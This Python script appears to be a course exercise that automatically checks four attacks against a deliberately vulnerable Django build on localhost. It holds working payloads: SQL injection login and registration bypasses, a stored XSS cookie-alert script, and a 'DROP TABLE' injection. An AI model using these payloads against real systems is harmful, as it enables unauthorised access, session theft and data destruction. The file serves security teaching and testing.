"""
Quick automated check that all 4 Part-B attacks work on the vulnerable build.
Run AFTER starting the server with:
  $env:DJANGO_SETTINGS_MODULE = "comunication_ltd.settings.vulnerable"
  python manage.py runserver
"""
import requests

BASE = "http://127.0.0.1:8000"
PASS = "\033[92m[PASS]\033[0m"
FAIL = "\033[91m[FAIL]\033[0m"
INFO = "\033[93m[INFO]\033[0m"


def get_csrf(session, url):
    r = session.get(url)
    for line in r.text.splitlines():
        if 'csrfmiddlewaretoken' in line:
            val = line.split('value="')[1].split('"')[0]
            return val
    return ""


def register_user(session, username, email, password):
    url = f"{BASE}/register"
    csrf = get_csrf(session, url)
    r = session.post(url, data={
        "csrfmiddlewaretoken": csrf,
        "username": username,
        "email": email,
        "password": password,
        "password2": password,
    })
    return r


def login_user(session, username, password):
    url = f"{BASE}/login"
    csrf = get_csrf(session, url)
    r = session.post(url, data={
        "csrfmiddlewaretoken": csrf,
        "username": username,
        "password": password,
    }, allow_redirects=True)
    return r


def add_client(session, name, phone="0501234567"):
    url = f"{BASE}/clients/add"
    csrf = get_csrf(session, url)
    r = session.post(url, data={
        "csrfmiddlewaretoken": csrf,
        "name": name,
        "phone": phone,
    }, allow_redirects=True)
    return r


print("\n" + "="*55)
print("  ATTACK TEST SUITE — vulnerable build")
print("="*55)

# ── Attack 2: SQLi on Login ──────────────────────────────────
print("\n[Attack 2] SQLi Login — OR '1'='1'")
# Need at least one user in DB for OR always-true to return a row
s2_seed = requests.Session()
register_user(s2_seed, "seeduser", "seed@test.com", "Abc123456!X")

s2 = requests.Session()
url = f"{BASE}/login"
csrf = get_csrf(s2, url)
r = s2.post(url, data={
    "csrfmiddlewaretoken": csrf,
    "username": "' OR '1'='1'#",
    "password": "wrong",
}, allow_redirects=True)
if "/clients" in r.url or "add" in r.url:
    print(f"  {PASS} Logged in without valid credentials (redirected to {r.url})")
else:
    print(f"  {FAIL} Login did NOT succeed — check vulnerable build is running")
    print(f"         Final URL: {r.url}")

# ── Attack 3: SQLi on Register (bypass duplicate check) ──────
print("\n[Attack 3] SQLi Register — bypass duplicate-user check")
s3 = requests.Session()
# Step 1: register alice normally
register_user(s3, "alice", "alice@test.com", "Abc123456!X")
# Step 2: confirm normal re-registration is blocked
r_normal = register_user(s3, "alice", "alice@test.com", "Abc123456!X")
normal_blocked = "already exists" in r_normal.text
# Step 3: try again with SQLi payload on username (same email — bypasses app check)
r = register_user(s3, "' AND '1'='2'#", "alice@test.com", "Abc123456!X")
app_check_bypassed = "already exists" not in r.text
if normal_blocked and app_check_bypassed:
    print(f"  {PASS} App-level duplicate check bypassed (no 'already exists' shown)")
    print(f"         DB unique constraint then blocks INSERT (500) — expected in this schema")
    print(f"         In a DB without UNIQUE constraints this would create a duplicate account")
elif not normal_blocked:
    print(f"  {FAIL} Normal re-registration was not blocked — check secure/vulnerable setting")
else:
    print(f"  {FAIL} 'already exists' still shown — SQLi did not bypass the check")

# ── Attack 1: Stored XSS on Add Client ───────────────────────
print("\n[Attack 1] Stored XSS — <script> in client name")
s1 = requests.Session()
register_user(s1, "xsstest", "xsstest@test.com", "Abc123456!X")
login_user(s1, "xsstest", "Abc123456!X")
xss_payload = '<script>alert(document.cookie)</script>'
r = add_client(s1, xss_payload)
# Check if raw <script> tag is in the rendered HTML (not escaped)
if xss_payload in r.text:
    print(f"  {PASS} Raw <script> tag present in rendered HTML — XSS stored successfully")
elif "&lt;script&gt;" in r.text:
    print(f"  {FAIL} Script was HTML-escaped — XSS did NOT work (running secure build?)")
else:
    print(f"  {INFO} Payload not found in response — may have redirected. URL: {r.url}")
    # Try to fetch client list to find the client detail page
    r2 = s1.get(f"{BASE}/clients/")
    if xss_payload in r2.text:
        print(f"  {PASS} Raw <script> tag found in client list page")
    elif "&lt;script&gt;" in r2.text:
        print(f"  {FAIL} Script was HTML-escaped in client list too")

# ── Attack 4: SQLi on Add Client ─────────────────────────────
print("\n[Attack 4] SQLi Add Client — malicious name injection")
s4 = requests.Session()
register_user(s4, "sqlitest", "sqlitest@test.com", "Abc123456!X")
login_user(s4, "sqlitest", "Abc123456!X")
payload = "'); DROP TABLE clients_client; --"
r = add_client(s4, payload)
# Check if the server errored (500) or handled it
if r.status_code == 500:
    print(f"  {PASS} Server returned 500 — raw SQL broke on the payload (injection triggered)")
elif r.status_code == 200 and "error" in r.text.lower():
    print(f"  {PASS} SQL error shown in response — injection triggered")
else:
    print(f"  {INFO} Status {r.status_code} — MySQL may block multi-statements by default")
    print(f"         This attack is best demonstrated manually in the browser")

print("\n" + "="*55 + "\n")
